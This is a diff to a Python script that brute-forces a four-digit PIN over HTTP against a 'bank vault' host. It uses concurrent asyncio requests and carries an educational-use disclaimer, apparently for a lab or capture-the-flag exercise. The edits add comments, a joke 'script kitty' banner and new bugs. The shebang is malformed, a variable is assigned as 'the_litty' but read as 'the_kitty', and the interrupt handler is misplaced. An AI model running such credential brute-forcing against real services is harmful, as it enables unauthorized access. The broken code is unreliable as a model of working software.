@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin python3
 
 # Disclaimer: This script is for educational purposes only.
 # Do not use against any server that you don't own or have authorization to test.
@@ -15,6 +15,7 @@ def print_header():
     """ This function prints header. """
     # Program Header
     print(r"""
+    
     ███    ███ ██    ██ ███    ██ ██ ███    ██ ███    ██
     ████  ████ ██    ██ ████   ██ ██ ████   ██ ████   ██
     ██ ████ ██ ██    ██ ██ ██  ██ ██ ██ ██  ██ ██ ██  ██
@@ -29,14 +30,18 @@ def print_header():
 
 
 try:
-    print_header()
-    print(f"Brute-forcing: {sys.argv[1]} on port: {sys.argv[2]}")
-    time.sleep(4)
+    print_header() # print the header
+    print(f"Brute-forcing: {sys.argv[1]} on port: {sys.argv[2]}") # print the arguments 
+    time.sleep(4) 
     url = sys.argv[1] # Use first argument as ip for server
     port = sys.argv[2] # Use second argument as port for service
     protocol = "http://" # We are using the http protocol to request the response
 except IndexError:
     raise SystemExit(f"Usage: {sys.argv[0]} <bank_vault_IP> <PORT>")
+except KeyboardInterrupt:
+#Statements to execute upon that exception
+    print("You typed CTRL + C, which is the keyboard interrupt exception")
+    sys.exit()
 
 async def fetch(session, pin):
     pin = str(pin).zfill(4) # Make a four-digit pincode, e.g., "0001" and not just "1"
@@ -50,10 +55,10 @@ async def fetch(session, pin):
 
 
 # A function to manage asyncio task-pool
-async def fetch_all(s, pins):
+async def fetch_all(session, pins):
     tasks = []
     for pin in pins:
-        task = asyncio.create_task(fetch(s, pin))
+        task = asyncio.create_task(fetch(session, pin))
         tasks.append(task)
     res = await asyncio.gather(*tasks)
     return res
@@ -66,5 +71,26 @@ async def main():
             if html is not None:
                 print(f"Found pin code: {html}")
 
+def script_kitty():
+    """ This function prints the script kitty header. """
+    # Program Header
+    print(r"""
+
+    ███████  ██████ ██████  ██ ██████  ████████     ██   ██ ██ ████████ ████████ ██    ██ 
+    ██      ██      ██   ██ ██ ██   ██    ██        ██  ██  ██    ██       ██     ██  ██  
+    ███████ ██      ██████  ██ ██████     ██        █████   ██    ██       ██      ████   
+         ██ ██      ██   ██ ██ ██         ██        ██  ██  ██    ██       ██       ██    
+    ███████  ██████ ██   ██ ██ ██         ██        ██   ██ ██    ██       ██       ██    
+                                                     
+                                                     """)
+    print("\n****************************************************************")
+    print("\n* Only Script Kiddies copy-paste other's scripts               *")
+    print("\n* Please try to understand the script before use               *")
+    print("\n****************************************************************")
+    print("_________________________________________________________")
+
 if __name__ == "__main__":
+    the_litty = input("Did you download the script? (n/y): ")
+    if the_kitty != "y":
+        script_kitty()
     asyncio.run(main())
